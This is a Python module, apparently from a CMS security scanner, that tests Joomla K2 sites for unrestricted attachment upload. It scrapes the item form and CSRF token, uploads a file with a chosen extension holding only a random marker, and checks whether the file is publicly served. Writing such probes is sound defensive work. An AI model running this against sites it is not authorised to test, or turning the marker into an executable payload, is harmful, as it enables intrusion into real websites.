from __future__ import annotations

import re
import urllib.parse
from typing import Any

from ...core.http import HttpSession
from ...core.probes import extract_csrf_candidates_from_html, rand_str

ADD_FORM_PATHS = [
    "/index.php?option=com_k2&view=item&task=add&tmpl=component",
    "/index.php?option=com_k2&view=item&task=add",
]
DEFAULT_SAVE_PATH = "/index.php?option=com_k2&view=item&task=save&tmpl=component"


def _hidden_fields(html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for tag in re.findall(r"<input\b[^>]*>", html, re.IGNORECASE):
        if not re.search(r'type=["\']hidden["\']', tag, re.IGNORECASE):
            continue
        name = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if not name:
            continue
        value = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
        fields[name.group(1)] = value.group(1) if value else ""
    return fields


def _category_id(html: str) -> str | None:
    select = re.search(
        r"<select\b[^>]*name=[\"']catid[\"'][^>]*>(.*?)</select>",
        html,
        re.IGNORECASE | re.DOTALL,
    )
    if not select:
        hidden = re.search(r'name=["\']catid["\'][^>]*value=["\']([0-9]+)["\']', html, re.IGNORECASE)
        return hidden.group(1) if hidden else None
    selected = re.search(r'<option\b[^>]*value=["\']([0-9]+)["\'][^>]*selected', select.group(1), re.IGNORECASE)
    if selected:
        return selected.group(1)
    first = re.search(r'<option\b[^>]*value=["\']([1-9][0-9]*)["\']', select.group(1), re.IGNORECASE)
    return first.group(1) if first else None


def discover_frontend_form(session: HttpSession) -> dict[str, Any] | None:
    for path in ADD_FORM_PATHS:
        response = session.get(path)
        body = response.get("body", "")
        if response.get("status") != 200 or not re.search(r"attachment_file|com_k2", body, re.IGNORECASE):
            continue
        token_candidates = extract_csrf_candidates_from_html(body)
        category = _category_id(body)
        if not token_candidates or not category:
            continue
        action_match = re.search(r'<form\b[^>]*action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        action = action_match.group(1).replace("&amp;", "&") if action_match else DEFAULT_SAVE_PATH
        if action.startswith(("http://", "https://")):
            parsed = urllib.parse.urlsplit(action)
            action = parsed.path + (f"?{parsed.query}" if parsed.query else "")
        return {
            "path": path,
            "action": action,
            "token": token_candidates[0],
            "category": category,
            "fields": _hidden_fields(body),
        }
    return None


def probe_inert_extension(
    target_url: str,
    extension: str,
    timeout: int = 12,
    proxy: str | None = None,
) -> dict[str, Any]:
    session = HttpSession(target_url, timeout=timeout, proxy=proxy)
    form = discover_frontend_form(session)
    if not form:
        return {"form_found": False, "accepted": False}

    marker = f"PROOFCMS_K2_{extension.upper()}_{rand_str(12).upper()}"
    filename = f"proofcms-k2-{rand_str(10)}.{extension}"
    fields = dict(form["fields"])
    fields.update(
        {
            "option": "com_k2",
            "view": "item",
            "task": "save",
            "title": f"ProofCMS {marker}",
            "catid": form["category"],
            "published": "0",
            "attachment_name[]": filename,
            "attachment_title[]": marker,
            "attachment_title_attribute[]": marker,
            form["token"]: "1",
        }
    )
    upload = session.post(
        form["action"],
        fields=fields,
        files={"attachment_file[]": (filename, marker.encode(), "text/plain")},
    )
    proof_path = f"/media/k2/attachments/{urllib.parse.quote(filename)}"
    proof = session.get(proof_path)
    accepted = proof.get("status") == 200 and marker in proof.get("body", "")
    return {
        "form_found": True,
        "accepted": accepted,
        "form_path": form["path"],
        "upload": upload,
        "proof": proof,
        "proof_url": f"{session.base_url}{proof_path}",
        "filename": filename,
        "marker": marker,
    }
